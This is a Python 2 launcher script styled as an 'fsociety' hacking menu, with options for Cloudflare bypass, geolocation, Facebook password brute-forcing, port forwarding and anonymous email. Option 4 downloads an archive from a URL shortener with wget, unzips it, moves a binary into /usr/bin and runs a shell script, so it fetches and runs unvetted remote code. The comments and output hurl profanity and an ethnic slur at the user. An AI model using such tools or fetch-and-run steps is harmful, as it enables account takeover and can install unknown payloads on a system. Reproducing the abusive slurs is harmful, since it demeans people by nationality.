#!usr/bin/python
import subprocess
import time
import os
import webbrowser


#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^ 
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^
#FUCK YOU ^_^

#STUPIDSCRIPTKIDDIE HAHAHAHAHAHAHAHAHAHAHAHAHAHHAHAH WHAT DA FAUCK HAHAHAHAHH

print"""
[!] 1. Toxic Cloudflare 

[!] 2. GPS SERVER and Geo Locate

[!] 3. Facebook Hack Password_List

[!] 4. Port Forwarding 

[!] 5. Gmail Anonymous Mail Sender

[X] quit
 """
new = raw_input("fsociety#~")
if new == "1":
 print "[+] Initilaizing Toxic Bypass: %s" % new
 os.system("clear")
 time.sleep(1)
 os.system("python toxic.py")
elif new == "2":
 print "[+] Initilaizing GPS SERVER: %s" % new
 os.system("clear")
 time.sleep(1)
 os.system("python gps_serve.py")
elif new == "3":
 print "[+] Initilaizing Facebook Bruteforce: %s" % new
 os.system("clear")
 time.sleep(1)
 os.system("perl fb.pl")
elif new == "4":
 print "[+] Initilaizing Port Forwarding: %s" % new
 os.system("clear")
 time.sleep(1)
 os.system("wget https://2no.co/2HYR65 ")
 time.sleep(1)
 os.system("unzip 2HYR65")
 time.sleep(1)
 os.system("cd 2HYR65")
 time.sleep(1)
 os.system("mv ngrok /usr/bin/")
 time.sleep(2)
 os.system("./portf.sh")
 time.sleep(2)
 os.system("rm -r 2HYR65")
 print("[+] Initilaizing Twist Port Forwarding Please Read the Following Options")
 os.system("twist --portforward")
if new == "5":
 print("[+] Send Anonymous Email")
 os.system("clear")
 webbrowser.open("http://anonymousemail.me")
 os.system("python ffffffff.py")
 os.system("cd fuckyou && python fuckyou.py")
elif new == "quit":
 print("[!] THANK YOU FOR WASTING MY TIME FUCK YOU HAHHHHAHAHAHAHAHAH XD have a nice fuckin day my friends")
elif new == "":
 print("[+] Example: 1/2/3/4/5")
else:
 print("[!] WHHHHHHHHHHHHAT THE FUUUUUUUUUUUCK! ARE YOU FUCKIN NOOB!? PLEASE DONT BE HACKER YOU NOOOOB! YOU SON OF THE BITCH! YOU MOTHER FUCKING IDIOT INDIAN OR WHAT COUNTRY YOU ARE YOU STUPID BETTER YOU DONT LEARN HACKING YOU STUPID FUUUUUUUUUUUUUUUUUUUUUUUUCK")
